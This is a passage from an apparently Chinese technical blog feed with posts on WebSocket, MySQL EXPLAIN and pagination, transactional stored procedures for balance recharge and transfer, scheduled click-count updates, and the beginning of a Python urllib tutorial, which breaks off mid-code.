Switched）<br>客户端：麻烦你有信息的时候推送给我噢。。<br>服务端：ok，有的时候会告诉你的。<br>服务端：balabalabalabala<br>服务端：balabalabalabala<br>服务端：哈哈哈哈哈啊哈哈哈哈<br>服务端：笑死我了哈哈哈哈哈哈哈</p><p>只需要经过一次HTTP请求，就可以做到源源不断的信息传送了。（在程序设计中，这种设计叫做回调，即：你有信息了再来通知我，而不是我傻乎乎的每次跑来问你 ）<br>这样的协议解决了上面同步有延迟，而且还非常消耗资源的这种情况。那么为什么他会解决服务器上消耗资源的问题呢？</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>其实我们所用的程序是要经过两层代理的，即HTTP协议在Nginx等服务器的解析下，然后再传送给相应的Handler（PHP等）来处理。简单地说，我们有一个非常快速的 接线员（Nginx） ，他负责把问题转交给相应的 客服（Handler） 。<br>本身接线员基本上速度是足够的，但是每次都卡在客服（Handler）了，老有客服处理速度太慢。，导致客服不够。Websocket就解决了这样一个难题，建立后，可以直接跟接线员建立持久连接，有信息的时候客服想办法通知接线员，然后接线员在统一转交给客户。<br>这样就可以解决客服处理速度过慢的问题了。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql-4 sql的优化-explian以及分页查询优化</title>
      <link href="/2017/09/17/mysql-4explian%E7%9A%84%E5%A6%99%E7%94%A8/"/>
      <url>/2017/09/17/mysql-4explian%E7%9A%84%E5%A6%99%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>在查询大数据表编写查询语句的时候，我们需要对我们编写的sql语句有一个性能了解，这时候我们需要使用到explain对sql语句进行检测。<br><a id="more"></a></p><h1 id="explain的妙用"><a href="#explain的妙用" class="headerlink" title="explain的妙用"></a>explain的妙用</h1><h2 id="建表"><a href="#建表" class="headerlink" title="建表"></a>建表</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `prod_main` (</span><br><span class="line">    `id` int(11) NOT NULL AUTO_INCREMENT COMMENT <span class="string">'商品id'</span>,</span><br><span class="line">    `prod_name` varchar(50) NOT NULL COMMENT <span class="string">'商品名称'</span>,</span><br><span class="line">    `prod_classid` int(11) NOT NULL COMMENT <span class="string">'商品分类'</span>,</span><br><span class="line">    `prod_intr` text COMMENT <span class="string">'商品简介'</span>,</span><br><span class="line">    `prod_adddate` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT <span class="string">'添加时间'</span>,</span><br><span class="line">    `prod_lastupdate` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT <span class="string">'上次更新时间'</span>,</span><br><span class="line">    `prod_click_all` int(11) DEFAULT <span class="string">'0'</span> COMMENT <span class="string">'总点击量'</span>,</span><br><span class="line">    `prod_click_month` int(11) DEFAULT <span class="string">'0'</span> COMMENT <span class="string">'月点击量'</span>,</span><br><span class="line">    `prod_sale_all` int(11) DEFAULT <span class="string">'0'</span>,</span><br><span class="line">    `prod_sale_month` int(11) DEFAULT <span class="string">'0'</span>,</span><br><span class="line">    `prod_com_all` int(11) DEFAULT <span class="string">'0'</span> COMMENT <span class="string">'总评价数'</span>,</span><br><span class="line">    `prod_com_month` int(11) DEFAULT <span class="string">'0'</span> COMMENT <span class="string">'月评价数'</span>,</span><br><span class="line">    PRIMARY KEY (`id`)</span><br><span class="line">  ) ENGINE=MyISAM DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure><h2 id="插入一百万数据"><a href="#插入一百万数据" class="headerlink" title="插入一百万数据"></a>插入一百万数据</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE sp_insert_goods()</span><br><span class="line">BEGIN</span><br><span class="line">                        <span class="built_in">set</span> @num=1;</span><br><span class="line">            WHILE @num&lt;1000000 DO</span><br><span class="line">                INSERT INTO prod_main(prod_name,prod_classid,prod_intr)VALUES(CONCAT(<span class="string">'商品'</span>,@num),@num,<span class="string">'</span></span><br><span class="line"><span class="string">秋冬日系彩点毛衣男套头羊毛衫男青年修身打底衫常规圆领针织衫男</span></span><br><span class="line"><span class="string">特别有设计性的一款毛衣，羊毛混纺面料，羊毛含量达到30%，兼顾保暖和性价比。面料采用混色彩点的设计，手臂的“8”字扭花源自爱尔兰传统服饰，在时尚界，这种“8”字扭花织法的毛衣学名叫做“渔夫毛衣”，有代表学院风的，有Da牌时尚款的，绞花混色毛衣传递着时尚信号，是随意、自信、而又具品位'</span>);</span><br><span class="line">                SET @num=@num+1;</span><br><span class="line">            END WHILE;</span><br><span class="line">END</span><br></pre></td></tr></table></figure><h2 id="explain的type指标"><a href="#explain的type指标" class="headerlink" title="explain的type指标"></a>explain的type指标</h2><p>explain命令用于分析sql语句的执行情况和成本预估<br>type表示标的连接类型，指标表明语句的性能执行情况，按照官方给出的指标，由好到坏依次是:<br>system(表中仅有一行，即常量表)、const(单表中最多有一个匹配行，例如primary key或者unique index)、eq_ref(对于前面的每一行，在此表中只查询一条记录，简单点来说，就是夺标连接中使用primary key 或者unique index)、ref(使用普通的索引)、ref_or_null（与 ref 类似，区别在于<br>条件中包含对 NULL 的查询）、index_merge(索引合并优化)、unique_subquery（in的后面是一个查询主键字段的子查询）、index_subquery（与 unique_subquery 类似，区别在于 in 的后面是查询非唯一索引字段的子查询）、range（单表中的范围查询）、<br>index（对于前面的每一行，都通过查询索引来得到数据）、all（对于前面的每一行都通过权标来得到数据）</p><p>根据这些指标以及其他key值，我们给表建索引和其他优化措施</p><h2 id="大数据下商品数据的分页"><a href="#大数据下商品数据的分页" class="headerlink" title="大数据下商品数据的分页"></a>大数据下商品数据的分页</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>简单的查询:使用limit<br><img src="beforefenye.png" alt=""><br>再来一个劲爆的<br><img src="fenye.png" alt=""><br>数据量一大，如果不优化一下，那真的是急死人了，翻一页就要等好久</p><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE sp_fenyeyouhua(IN startRow int,IN pagesize int)</span><br><span class="line">BEGIN</span><br><span class="line">    <span class="comment">#Routine body goes here...</span></span><br><span class="line">        SELECT * from prod_main <span class="built_in">where</span> id&lt;=(select id from prod_main ORDER BY id desc <span class="built_in">limit</span> startRow,1) ORDER BY id DESC LIMIT pagesize;</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>执行同样的功能<br><img src="fenyeafter.png" alt=""><br>对比很明显，同一台机器，优化措施见效快，疗效好！</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql-3 用户充值与转账功能的实现</title>
      <link href="/2017/09/14/%E7%94%A8%E6%88%B7%E5%85%85%E5%80%BC%E5%8A%9F%E8%83%BD%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
      <url>/2017/09/14/%E7%94%A8%E6%88%B7%E5%85%85%E5%80%BC%E5%8A%9F%E8%83%BD%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>在电商网站，我们经常会使用到充值与转账功能，接下来我们使用存储过程模拟充值过程。<br>本文涉及到的相关知识点</p><ul><li>事务，自定义异常,表锁，行锁</li><li>row_count:增加，修改影响的条数</li><li>found_rows:查询影响的条数</li></ul><p><a href="http://blog.sae.sina.com.cn/archives/2127" target="_blank" rel="noopener">mysql锁的详解</a><br><a href="https://www.2cto.com/database/201511/450387.html" target="_blank" rel="noopener">事务的详解</a><br>需求:安全性高，性能好的用户充值<br>解决方案:</p><h1 id="设计表"><a href="#设计表" class="headerlink" title="设计表"></a>设计表</h1><ul><li>用户余额表<pre><code class="bash">CREATE TABLE `user_blance` (  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT <span class="string">'用户充值表自增id'</span>,  `user_id` int(11) NOT NULL COMMENT <span class="string">'用户id'</span>,  `user_money` decimal(10,2) NOT NULL COMMENT <span class="string">'用户充值金额'</span>,  PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;</code></pre></li><li><p>用户充值记录表</p><pre><code class="bash">CREATE TABLE `user_blance_log` (  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT <span class="string">'用户充值记录表id'</span>,  `user_id` int(11) DEFAULT NULL COMMENT <span class="string">'用户id'</span>,  `log_type` int(11) DEFAULT NULL COMMENT <span class="string">'日志类型'</span>,  `log_des` varchar(255) DEFAULT NULL COMMENT <span class="string">'日志描述'</span>,  `log_value` decimal(10,2) DEFAULT NULL COMMENT <span class="string">'日志值'</span>,  `log_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT <span class="string">'日志记录时间'</span>,  PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;</code></pre><h1 id="用户充值的步骤"><a href="#用户充值的步骤" class="headerlink" title="用户充值的步骤"></a>用户充值的步骤</h1></li><li><p>往日志表里面插入记录</p></li><li><p>若插入成功，则更新余额表的值，余额表里面需要判断用户id是否存在，如果存在则update否则insert</p></li></ul><h2 id="存储过程模拟充值"><a href="#存储过程模拟充值" class="headerlink" title="存储过程模拟充值"></a>存储过程模拟充值</h2><pre><code class="bash">CREATE PROCEDURE chongzhi(IN _user_id int,IN _log_type tinyint,IN _log_des varchar(200),IN _log_value decimal(10,2))BEGIN    <span class="comment">#Routine body goes here...</span>    DECLARE t_error int DEFAULT 0;    DECLARE usercount int DEFAULT 0;    <span class="comment">#异常处理</span>    DECLARE CONTINUE HANDLER <span class="keyword">for</span> SQLEXCEPTION  <span class="built_in">set</span> t_error=1;    START TRANSACTION;    <span class="comment">#插入用户充值日志表</span>    INSERT INTO user_blance_log(user_id,log_type,log_des,log_value)VALUES(_user_id,_log_type,_log_des,_log_value);    <span class="comment">#插入到充值表中</span>    <span class="keyword">if</span> ROW_COUNT()&gt;0 THEN            <span class="comment">#判断是否存在用户</span>            SELECT COUNT(*) into usercount  FROM user_blance WHERE user_id=_user_id;            <span class="comment">#存在用，则执行update</span>            <span class="keyword">if</span> usercount&gt;0 THEN                UPDATE user_blance <span class="built_in">set</span> user_money=user_money+_log_value <span class="built_in">where</span> user_id=_user_id;            ELSE                insert into user_blance(user_id,user_money)VALUES(_user_id,_log_value);            END IF;    END IF;    <span class="comment">#出现异常，回滚</span>    <span class="keyword">if</span> t_error=1 THEN        ROLLBACK;    ELSE        COMMIT;    END IF;END</code></pre><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><ul><li>多线程并发，操作不当会造成数据数据冲突<br>解决方案:mysql表锁机制</li></ul><p>表级锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高，并发度最低。<br>MySQL表级锁有两种模式：表共享锁（Table Read Lock）和表独占写锁（Table Write Lock）。<br>对MyISAM的读锁，不会阻塞其他用户对同一表请求，但会阻塞对同一表的写请求；<br>对MyISAM的写锁，则会阻塞其他用户对同一表的读和写操作；<br>当一个线程获得对一个表的写锁后，只有持有锁线程可以对表进行更新操作。其他线程的读、写操作都会等待，直到锁被释放为止。<br>综上，我们应该对上述操作加上写锁</p><pre><code class="bash">lock table user_blacne write;call chongzhi(3,1,<span class="string">'充值'</span>,12)UNLOCK tables;</code></pre><p>保证用户余额表每次查询插入或者更新的时候只有一个会话独占，保证数据的准确性，如果在Innodb存储引擎下，使用行锁是最佳选择</p><h1 id="用户转账的步骤"><a href="#用户转账的步骤" class="headerlink" title="用户转账的步骤"></a>用户转账的步骤</h1><ul><li><p>查询用户的余额，并锁住转账两个用户之间用户余额表的的行数据</p></li><li><p>对比余额跟要转账的额度，如果超过，则跳转余额不足，否则，则更改转帐人与被转帐人的余额</p></li></ul><h2 id="存储过程模拟用户转账与行锁"><a href="#存储过程模拟用户转账与行锁" class="headerlink" title="存储过程模拟用户转账与行锁"></a>存储过程模拟用户转账与行锁</h2><p>有索引并且使用了该索引当条件的时候就是行锁，<br>没有索引的时候就是表锁，且mysliam不支持行锁。<br>innodb 的行锁是在有索引的情况下,没有索引的表是锁定全表的.<br>在这里我们使用行级锁，保证并发操作时的数据正确性，行级锁并发度高，常用解决并发操作问题<br>行级锁有两个类型的锁，共享锁和排他锁，类似我么男表所中的读锁和写锁<br>首先为user_blance表添加用户id的索引，如图所示<br><img src="suoyin.png" alt="索引"></p><p>业务过程:</p><pre><code class="bash">CREATE PROCEDURE sp_transfer(IN fromuser int,IN touser int,IN _money decimal(10,2))BEGIN    <span class="comment">#Routine body goes here...</span>    DECLARE fromuser_money DECIMAL(10,2) DEFAULT 0;    DECLARE touser_money DECIMAL(10,2) DEFAULT 0;    DECLARE error bit  DEFAULT FALSE;    DECLARE CONTINUE HANDLER FOR SQLEXCEPTION SET @error=<span class="literal">true</span>;    START TRANSACTION;        <span class="comment">#这里使用了行锁中的排他锁</span>        SELECT user_money into fromuser_money from user_blance <span class="built_in">where</span> user_id=fromuser <span class="keyword">for</span> update;        SELECT user_money into touser_money from user_blance <span class="built_in">where</span> user_id=touser <span class="keyword">for</span> update;        <span class="keyword">if</span> fromuser_money&lt;_money THEN                COMMIT;                SELECT <span class="string">'钱不够'</span> as result;        ELSE                <span class="built_in">set</span> fromuser_money=fromuser_money-_money;                <span class="built_in">set</span> touser_money=touser_money+_money;                UPDATE user_blance <span class="built_in">set</span> user_money=fromuser_money WHERE user_id=fromuser;                UPDATE user_blance <span class="built_in">set</span> user_money=touser_money WHERE user_id=touser;        END IF;        IF error=TRUE THEN                ROLLBACK;                SELECT <span class="string">'出错'</span> as result;        ELSE                COMMIT;                SELECT <span class="string">'转帐成功！'</span>;        END IF;END</code></pre><p>最后调用存储过程</p><pre><code class="bash">call sp_transfer</code></pre>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql-2 使用游标和计划任务定时更新商品总点击量</title>
      <link href="/2017/09/12/mysql%E4%BD%BF%E7%94%A8%E6%B8%B8%E6%A0%87%E5%92%8C%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0%E5%95%86%E5%93%81%E6%80%BB%E7%82%B9%E5%87%BB%E9%87%8F-2/"/>
      <url>/2017/09/12/mysql%E4%BD%BF%E7%94%A8%E6%B8%B8%E6%A0%87%E5%92%8C%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0%E5%95%86%E5%93%81%E6%80%BB%E7%82%B9%E5%87%BB%E9%87%8F-2/</url>
      
        <content type="html"><![CDATA[<p>此mysql系列的文章都是在大数据量下的模拟的，上一节我们使用存储过程模拟插入了100万数据，接下来，我们继续探讨在大数据量下，商品系统的设计以及相对应mysql的解决方案<br>需求：模拟在数据量比较大的情况，商品的总点击量是怎么统计的？类似于淘宝有总点击量和月点击销量<br>解决方案:<br><a id="more"></a></p><h1 id="商品表的设计"><a href="#商品表的设计" class="headerlink" title="商品表的设计"></a>商品表的设计</h1><h2 id="商品表"><a href="#商品表" class="headerlink" title="商品表"></a>商品表</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `prod_main` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT <span class="string">'商品id'</span>,</span><br><span class="line">  `prod_name` varchar(50) NOT NULL COMMENT <span class="string">'商品名称'</span>,</span><br><span class="line">  `prod_classid` int(11) NOT NULL COMMENT <span class="string">'商品分类'</span>,</span><br><span class="line">  `prod_intr` text COMMENT <span class="string">'商品简介'</span>,</span><br><span class="line">  `prod_adddate` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT <span class="string">'添加时间'</span>,</span><br><span class="line">  `prod_lastupdate` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT <span class="string">'上次更新时间'</span>,</span><br><span class="line">  `prod_click_all` int(11) DEFAULT <span class="string">'0'</span> COMMENT <span class="string">'总点击量'</span>,</span><br><span class="line">  `prod_click_month` int(11) DEFAULT <span class="string">'0'</span> COMMENT <span class="string">'月点击量'</span>,</span><br><span class="line">  `prod_sale_all` int(11) DEFAULT <span class="string">'0'</span>,</span><br><span class="line">  `prod_sale_month` int(11) DEFAULT <span class="string">'0'</span>,</span><br><span class="line">  `prod_com_all` int(11) DEFAULT <span class="string">'0'</span> COMMENT <span class="string">'总评价数'</span>,</span><br><span class="line">  `prod_com_month` int(11) DEFAULT <span class="string">'0'</span> COMMENT <span class="string">'月评价数'</span>,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=MyISAM DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure><h2 id="商品分类表"><a href="#商品分类表" class="headerlink" title="商品分类表"></a>商品分类表</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `prod_main` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT <span class="string">'商品id'</span>,</span><br><span class="line">  `prod_name` varchar(50) NOT NULL COMMENT <span class="string">'商品名称'</span>,</span><br><span class="line">  `prod_classid` int(11) NOT NULL COMMENT <span class="string">'商品分类'</span>,</span><br><span class="line">  `prod_intr` text COMMENT <span class="string">'商品简介'</span>,</span><br><span class="line">  `prod_adddate` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT <span class="string">'添加时间'</span>,</span><br><span class="line">  `prod_lastupdate` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT <span class="string">'上次更新时间'</span>,</span><br><span class="line">  `prod_click_all` int(11) DEFAULT <span class="string">'0'</span> COMMENT <span class="string">'总点击量'</span>,</span><br><span class="line">  `prod_click_month` int(11) DEFAULT <span class="string">'0'</span> COMMENT <span class="string">'月点击量'</span>,</span><br><span class="line">  `prod_sale_all` int(11) DEFAULT <span class="string">'0'</span>,</span><br><span class="line">  `prod_sale_month` int(11) DEFAULT <span class="string">'0'</span>,</span><br><span class="line">  `prod_com_all` int(11) DEFAULT <span class="string">'0'</span> COMMENT <span class="string">'总评价数'</span>,</span><br><span class="line">  `prod_com_month` int(11) DEFAULT <span class="string">'0'</span> COMMENT <span class="string">'月评价数'</span>,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=MyISAM DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure><h2 id="点击日志表"><a href="#点击日志表" class="headerlink" title="点击日志表"></a>点击日志表</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `prod_clicklog` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `prod_id` int(11) NOT NULL COMMENT <span class="string">'商品id'</span>,</span><br><span class="line">  `user_ip` varchar(255) NOT NULL COMMENT <span class="string">'用户ip'</span>,</span><br><span class="line">  `user_id` int(11) NOT NULL COMMENT <span class="string">'用户id'</span>,</span><br><span class="line">  `clickdate` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT <span class="string">'点击时间'</span>,</span><br><span class="line">  `clicknum` int(11) NOT NULL DEFAULT <span class="string">'0'</span> COMMENT <span class="string">'点击次数'</span>,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=MyISAM AUTO_INCREMENT=12 DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure><h1 id="模拟读取商品页面"><a href="#模拟读取商品页面" class="headerlink" title="模拟读取商品页面"></a>模拟读取商品页面</h1><ul><li>从商品表根据id读取商品所有信息</li><li>如果读取到商品的信息，则记录点击量到点击日志表中<br>存储过程实现如下，可以用程序，为了熟悉一下存储过程，以下使用了存储过程的写法</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE p_read_prod(IN _pro_id int,IN _user_ip varchar(15),IN _user_id int) </span><br><span class="line">    BEGIN</span><br><span class="line">        <span class="comment">#Routine body goes here...</span></span><br><span class="line">        <span class="built_in">set</span> @num=0;</span><br><span class="line">        SELECT * from prod_main <span class="built_in">where</span> id=_pro_id <span class="built_in">limit</span> 1;</span><br><span class="line">        SET @num=FOUND_ROWS();</span><br><span class="line">        <span class="keyword">if</span> @num=1 THEN</span><br><span class="line">                select count(*) into @res from prod_clicklog <span class="built_in">where</span> prod_id=_pro_id and user_ip=_user_ip and user_id=_user_id;</span><br><span class="line">                IF @res&gt;0 THEN</span><br><span class="line">                    UPDATE prod_clicklog <span class="built_in">set</span> clicknum=clicknum+1 WHERE prod_id=_pro_id and user_ip=_user_ip and user_id=_user_id;</span><br><span class="line">                ELSE</span><br><span class="line">                    INSERT INTO prod_clicklog(prod_id,user_ip,user_id)VALUES(_pro_id,_user_ip,_user_id);</span><br><span class="line">                END IF;</span><br><span class="line">        END IF;</span><br><span class="line">    END</span><br></pre></td></tr></table></figure><p>调用存储过程<br>可以模拟数据插入到日志表中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CALL p_read_prod(1,<span class="string">'192.167.16.12'</span>,21)</span><br></pre></td></tr></table></figure><h1 id="统计点击量，并定时更新到主表中"><a href="#统计点击量，并定时更新到主表中" class="headerlink" title="统计点击量，并定时更新到主表中"></a>统计点击量，并定时更新到主表中</h1><p>日志表中记录有不同ip不同用户的点击量，因为数据量一大，实时更新点击量，对数据库压力过大，所以采用在访问不繁忙的时间段对点击量进行更新</p><h2 id="游标的编写"><a href="#游标的编写" class="headerlink" title="游标的编写"></a>游标的编写</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CREATE PROCEDURE update_clicknum()</span><br><span class="line">  BEGIN</span><br><span class="line">      <span class="comment">#Routine body goes here...</span></span><br><span class="line">      <span class="comment">#定义需要接受游标数据的变量</span></span><br><span class="line">      DECLARE isdone int DEFAULT 0;</span><br><span class="line">      DECLARE pro_id int;<span class="comment">#商品id</span></span><br><span class="line">      DECLARE cnum int;<span class="comment">#代表点击数量</span></span><br><span class="line">      <span class="comment">#定义游标</span></span><br><span class="line">      DECLARE cur CURSOR FOR SELECT prod_id,sum(clicknum) from prod_clicklog GROUP BY prod_id;</span><br><span class="line">      <span class="comment">#将结束标志绑定到游标当中</span></span><br><span class="line">      DECLARE CONTINUE HANDLER FOR NOT FOUND SET isdone=TRUE;</span><br><span class="line">      <span class="comment">#打开游标</span></span><br><span class="line">      open cur;</span><br><span class="line">      <span class="comment">#开始循环</span></span><br><span class="line">      read_loop:LOOP</span><br><span class="line">          <span class="comment">#提取游标里的数据</span></span><br><span class="line">          FETCH cur INTO pro_id,cnum;</span><br><span class="line">          <span class="comment">#声明结束的收</span></span><br><span class="line">          IF isdone THEN</span><br><span class="line">              LEAVE read_loop;</span><br><span class="line">          END IF;</span><br><span class="line">          <span class="comment">#更新点击量</span></span><br><span class="line">          update prod_main <span class="built_in">set</span> prod_click_all=cnum <span class="built_in">where</span> id=pro_id;</span><br><span class="line">      END LOOP;</span><br><span class="line">      <span class="comment">#关闭游标</span></span><br><span class="line">      CLOSE cur;</span><br><span class="line">  END</span><br></pre></td></tr></table></figure><h2 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CALL update_clicknum</span><br></pre></td></tr></table></figure><h2 id="使用mysql事件，计划定时调用上述存储过程"><a href="#使用mysql事件，计划定时调用上述存储过程" class="headerlink" title="使用mysql事件，计划定时调用上述存储过程"></a>使用mysql事件，计划定时调用上述存储过程</h2><p>记得要让开启事件处理<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SET GLOBAL event_scheduler=TRUE</span><br></pre></td></tr></table></figure></p><p>为了方便，直接使用navicat可视化操作设置定时事件<br>直接在事件中，调用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CALL update_clicknum</span><br></pre></td></tr></table></figure></p><p>设置每天晚上定时更新当天的点击量</p><p><img src="定时计划.png" alt="定时任务"></p><p>这个思路可以用到很多种场景，如点赞数量，销量！</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>python-2，urlib、BeautifulSoup、sqlalchemy等第三方库的使用</title>
      <link href="/2017/09/11/python-series2/"/>
      <url>/2017/09/11/python-series2/</url>
      
        <content type="html"><![CDATA[<p>python-2，urlib、BeautifulSoup、sqlalchemy等第三方库的使用<br><a id="more"></a></p><h1 id="python学习系列2"><a href="#python学习系列2" class="headerlink" title="python学习系列2"></a>python学习系列2</h1><h2 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a><strong>开篇</strong></h2><p>其实学习语言多了，你会发现不管学什么语言，都逃不出如下套路：</p><ul><li><p>1.怎么定义变量，是否有数据类型，怎么在控制台输出</p></li><li><p>2.如何定义函数，如何定义类，面向对象的写法是如何的？</p></li><li><p>3.如何调用外部类</p></li><li><p>4.如何读写文件，网络编程</p></li><li><p>5.如何与数据库交互</p></li><li><p>6.如何和各种第三方库交互</p></li><li><p>7.有什么比较好的框架可以使用</p></li></ul><p>上述语言仅限web后端语言，快速上手的套路无非就是有语言基础，编程经验弄懂上面这些套路，后续入门之后，我们可以再深入学习语言的特性，设计模式，以及性能调优这些。<br>讲完上述套路之后，我们根据以上的套路开始我们的python快速上手之旅，当然，最主要的是我们要结合手册弄懂上述这些知识点，然后动手做项目，看懂别人的源码，差不多就入门了。而且后端重点不在于语言本身，而在业务以及数据库上面。</p><p>python现在比较火的方向</p><ul><li>python web</li><li>python 数据分析与数据挖掘</li><li>机器学习</li></ul><h2 id="使用urlib"><a href="#使用urlib" class="headerlink" title="使用urlib"></a>使用urlib</h2><p>urllib提供了一系列用于操作URL的功能。</p><ul><li>get<br>urllib的request模块可以非常方便地抓取URL内容，也就是发送一个GET请求到指定的页面，然后返回HTTP的响应：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from urllib import request</span><br><span class="line"></span><br><span class="line">with request.urlopen(<span class="string">'http://xhzyxed.cn/'</span>) as f:</span><br><span class="line">    data = f.read()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'Status:'</span>, 